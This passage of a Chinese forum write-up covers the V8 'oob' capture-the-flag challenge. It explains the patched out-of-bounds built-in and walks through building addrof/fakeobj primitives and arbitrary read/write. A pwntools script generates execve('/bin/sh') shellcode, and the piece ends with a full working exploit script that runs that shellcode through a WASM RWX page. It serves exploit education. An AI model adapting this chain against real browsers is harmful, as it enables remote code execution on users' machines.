let a = [1.1, 2.2, 3.3];
a.oob();        // 读
a.oob(1.337);   // 写
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/607f925b252ee07b.jpg)

  

定义内置函数ArrayOob(),ArrayOob能调用isolate（当前实例）跟args（调用参数）变量

uint32_t len = args.length();取本次参数调用个数（args\[0\]->this也算一个），故arr.oob(x)->length == 2，len>2时直接return underfined

JSReceiver表示 V8 里“可以接收属性访问的 JS 对象”的基类

```
{}
[]
function(){}
new Date()
```

例如这些

Handle<JSReceiver>

表示一个由 V8 GC 管理的 `JSReceiver` 引用，receiver是变量名

`args.receiver()` ：拿到当前函数调用里的 \*\*receiver，也就是 \*\* `**this**`

然后把JSReceiver转化成JSArray类型的Handle。取内存，转化成FixedDoubleArray，取length转化成number。

接下来是个条件分支，len =1 read，len = 2 write

-   ```
    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    ```
    

这一块实际上最后一个元素应该是length-1,这里正好能越界访问一个元素

-   ```
    elements.set(length,value->Number());
    ```
    

相当于elements\[length\] = value;oob方法相当于提供一个8字节的越界读写

## 利用构造

JS是不能直接读addr的，但通过类型混淆可以让v8将一个addr pointer所在8字节当成 double 数组里的浮点数读出来。

首先构造froi()跟itof()函数转化再JS里的数据表示

ftoi(float) -> BigInt：把泄露出来的 double 还原成 64-bit 整数地址

itof(BigInt) -> float：把想写入的 64-bit 地址伪装成 double 写回内存

等于是同一块内存不同的解释方式

```javascript
var buf = new ArrayBuffer(8)
var f64_buf = new Float64Array(buf)
var u32_buf = new Uint32Array(buf)

function ftoi(val){   // float to BigInt
  f64_buf[0] = val;
return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function itof(val){   // BigInt to float
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
return f64_buf[0];
}
```

f64与u32共享buf，但对数据的解释方式不一样

ftoi通过f64传入val并用u32读取相加成BigInt(高位值左移32位与低位值相加)

itof用u32拆开val，& 0xffffffffn 表示位与，低32位保留，高位清0；高位右移

```
val            = HHHHHHHH LLLLLLLL
val & 0xffffffffn → 00000000 LLLLLLLL   ← 低 32 位
val >> 32n        → 00000000 HHHHHHHH   ← 高 32 位搬到低位
//大概长这样，高低位分别运算并存储
```

*00000000 LLLLLLLL*

*00000000 HHHHHHHH*

注意这是显示形式，u32储存的是32位数据（JS中普通数字都是 `Number` ，>>这类位运算会先把number **转换成 32 位整数** 再进行操作 ），两个加起来正好是64位

### addrof()/fakeobj()

addrof()把obj数组的map改成浮点数的map,fakeobj()相反

```javascript
var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1,1.2,1.3,1.4];

var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj){
  obj_arr[0] = in_obj;
  obj_arr.oob(float_arr_map);
let addr = obj_arr[0];
  obj_arr.oob(obj_arr_map);
return ftoi(addr);
}
function fakeobj(addr){
  float_arr[0] = itof(addr);
  float_arr.oob(obj_arr_map);
let fake = float_arr[0];
  float_arr.oob(float_arr_map);
return fake;
}
```

这里得注意到obj_arr.oob()读出的正好是该buffer的下一个8字节，也就是该数组对象自己的map

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/486abc687e1ab8de.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/03992a12dea6e3a2.jpg)

  

发现array buf后就是其JS对象的map指针

```
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();
```

对应其数组指针

addof()传入一个JS对象return 对象地址

fakeobj()传入一个地址，然后让v8认为这是一个JS对象

都是通过改map的方式实现类型混淆

最后得把map改回来避免后续操作把数组搞坏

### 任意读写

这里的n是JS BigInt字面量标记

```javascript
var arb_rw_arr = [float_arr_map,1.2,1.3,1.4]; 
//这里的float_arr_map是double值
function arb_read(addr){
if (addr%2n == 0) addr += 1n; 
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
return ftoi(fake[0]);
}
function initial_arb_write(addr,val){
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  fake[0] = itof(BigInt(val));
}
```

伪造一个 JSArray，然后不断修改这个假数组的 `elements` 指针，让 `fake[0]` 实际去读/写任意地址。

arb_read()中

```
if (addr%2n == 0) addr += 1n;
```

用于伪造tagged pointer，欺骗v8把他当成JS对象

```
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
```

在arb_rw_arr 数组对象指针指向的addr-0x20处，也就是它的buffer构造一个伪JS对象。

```
arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
```

把假数组的 `elements` 指针控制成：

```
addr - 0x10
```

JSArray的布局大致如此

```
JSArray
┌─────────────────────┐
│ map                 │  告诉是什么类型
├─────────────────────┤
│ properties          │
├─────────────────────┤
│ elements            │ ────────> 真正存数组元素的地方
├─────────────────────┤
│ length              │
└─────────────────────┘
```

JSArray 本身只有 4 个字段（0x20 字节），元素放在堆上另一块连续内存里（这种设计便于共享内存以及copy on write）

即elements指向某块内存，fake\[0\]是去 elements 指向的+0x10处读取第 0 个元素。

arb_rw_arr的内存布局变化：

```
真实 arb_rw_arr 的 FixedDoubleArray
┌──────────────────────────────┐
│ E+0x00: FixedDoubleArray.map  │
│ E+0x08: length                │
│ E+0x10: elements[0]           │ = float_arr_map  ──> 被当成 fake.map
│ E+0x18: elements[1]           │ = 1.2            ──> 被当成 fake.properties
│ E+0x20: elements[2]           │ = 1.3            ──> 被当成 fake.elements
│ E+0x28: elements[3]           │ = 1.4            ──> 被当成 fake.length
└──────────────────────────────┘
          ↑
          │ fake = fakeobj(A - 0x20) = fakeobj(E + 0x10)
          │

改 arb_rw_arr[2]：
E+0x20 = addr - 0x10
        ↓
fake.elements = addr - 0x10
        ↓
fake[0] 实际访问：
fake.elements + 0x10 = addr
        ↓
读/写 addr
```

这里有一点注意下， `elements` 指向的通常不是第一个实际数据，而是一个 `FixedArray/FixedDoubleArray` 结构，当前版本下的offset为0x10

内存布局长这样

```
E+0x00  ┃ FixedDoubleArray 的 map        ┃ ┐
E+0x08  ┃ length = 4                      ┃ ┘ buffer 头，共 0x10
E+0x10  ┃ element[0] = float_arr_map     ┃ ← fake 必须从这一行开始
E+0x18  ┃ element[1] = 1.2               ┃
E+0x20  ┃ element[2] = 1.3               ┃  数据区，4 × 8 = 0x20
E+0x28  ┃ element[3] = 1.4               ┃
E+0x30  ┃ ───────── buffer 结束 ─────────┃
A+0x00  ┃ JSArray.map                     ┃ ← A = E + 0x30
A+0x08  ┃ properties                      ┃
A+0x10  ┃ elements → E                    ┃
A+0x18  ┃ length = 4                      ┃
```

等于是<font style="color:rgb(15, 17, 21);background-color:rgb(250, 250, 250);">arb_rw_arr</font>的元素区被借出来塞进fake对象</font>

### WASM

用wasm申请一个RWX页

这里可以用用wat2wasm、wasm2wat

```
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
```

这里复用一下之前的wasm，含义大致是导出一块 Wasm Linear Memory

main（）函数return 42

```javascript
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);
```

编译mod,实例化，导出main函数，read rwx_page_addr

这里的0x88得gdb看一下

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1c6d56fa3d0a7a89.jpg)

  

wasm_instance = 0x2421fb1a0d31

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2f943fd988c94321.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/28ffc07af54d158e.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/21da80ec1def18ff.jpg)

  
gdb就是好用啊

#### copy_shellcode

```javascript
function copy_shellcode(addr,shellcode){
let abuf = new ArrayBuffer(0x100);
let dataview = new DataView(abuf);
let backing_store_addr = addrof(abuf) + 0x20n; 
initial_arb_write(backing_store_addr,addr);

for(let i = 0;i < shellcode.length;i++){
    dataview.setUint32(4*i,shellcode[i],true);
  }
}
```

0x20是backing store 的offset

dataview.setUint32(4*i,shellcode\[i\],true);，32位小端序写入

这里用pwntools生成一下shellcode

```python
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'

sc = asm("""
    lea  rdi, [rip + sh]
    xor  esi, esi
    xor  edx, edx
    mov  eax, 59
    syscall
sh:
    .asciz "/bin/sh"
""")

sc = sc.ljust((len(sc) + 3) // 4 * 4, b'\x90')

print("// %d bytes" % len(sc))
print("var shellcode = [")
words = ["0x" + sc[i:i+4][::-1].hex() for i in range(0, len(sc), 4)]
for i in range(0, len(words), 6):
print("    " + ", ".join(words[i:i+6]) + ",")
print("];")
print(disasm(sc))
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0f34f853d87f3f98.jpg)

```
var shellcode = [
0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
0x90900068,
];
```

### exp

```javascript
var buf = new ArrayBuffer(8)
var f64_buf = new Float64Array(buf)
var u32_buf = new Uint32Array(buf)

function ftoi(val){   // float to BigInt
  f64_buf[0] = val;
return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function itof(val){   // BigInt to float
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
return f64_buf[0];
}

var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1,1.2,1.3,1.4];

var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj){
  obj_arr[0] = in_obj;
  obj_arr.oob(float_arr_map);
let addr = obj_arr[0];
  obj_arr.oob(obj_arr_map);
return ftoi(addr);
}
function fakeobj(addr){
  float_arr[0] = itof(addr);
  float_arr.oob(obj_arr_map);
let fake = float_arr[0];
  float_arr.oob(float_arr_map);
return fake;
}

var arb_rw_arr = [float_arr_map,1.2,1.3,1.4]; 
//这里的float_arr_map是double值
function arb_read(addr){
if (addr%2n == 0) addr += 1n; 
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
return ftoi(fake[0]);
}
function initial_arb_write(addr,val){
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  fake[0] = itof(BigInt(val));
}

var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

function copy_shellcode(addr,shellcode){
let abuf = new ArrayBuffer(0x100);
let dataview = new DataView(abuf);
let backing_store_addr = addrof(abuf) + 0x20n; 
initial_arb_write(backing_store_addr,addr);

for(let i = 0;i < shellcode.length;i++){
    dataview.setUint32(4*i,shellcode[i],true);
  }
}
var shellcode = [
0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
0x90900068,
];

copy_shellcode(rwx_page_addr, shellcode);
f();
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f9aa947eb783821f.jpg)

  

终于出了。

## 参考文献

-   从 0 开始学 V8 漏洞利用之环境搭建（一）  
    https://cloud.tencent.com/developer/article/1945764
    
-   从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）  
    https://cloud.tencent.com/developer/article/1945766
    
-   从 0 开始学 V8 漏洞利用之 V8 通用利用链（三）  
    https://cloud.tencent.com/developer/article/1945767
    
-   Seebug 漏洞平台  
    https://cloud.tencent.com/developer/column/2195
    
-   https://www.freebuf.com/vuls/203721.html
    
-   这个讲 starctf oob 质量也挺好  
    https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
    
-   V8 入门，好文章  
    https://tokameine.gitbook.io/chose-me-or-javascript-v8
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d10fb400ebe024ba.jpg)

看雪ID：shark_pro

https://bbs.kanxue.com/user-home-703941.htm

\*本文为看雪论坛精华文章，由 shark_pro 原创，转载请注明来自看雪社区

火热售票中！1.25折门票即将售罄

\# 往期推荐

[当高频观测不再经过异常路径：Shadow Cave 与常驻式插桩架构](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619028&idx=1&sn=5a500adeee5194bc8b270c6819973a89&scene=21#wechat_redirect)

[D3CTF 2026 d3llvm.apk 反调试定位与加密 SO的Dump](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618994&idx=2&sn=f6d8e52efe0c96ba3684bce3529c3d30&scene=21#wechat_redirect)

[一串反引号，十层突破：n1ctf‑2018‑easy_harder_php 完整利用链](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618948&idx=2&sn=fe39b3c0600fbd53ced86ae6e2ed499e&scene=21#wechat_redirect)

[实现一个EDR不可见的网络通信（将lwip移植到nt内核中）](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618790&idx=2&sn=614beed6bb13fdc6c918aa6d9bb006d6&scene=21#wechat_redirect)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bc51e60a1ab9953f.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c953c0b9b281634c.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3bda3987c6441739.webp)

**球分享**

**球点赞**

**球在看**

点击阅读原文查看更多
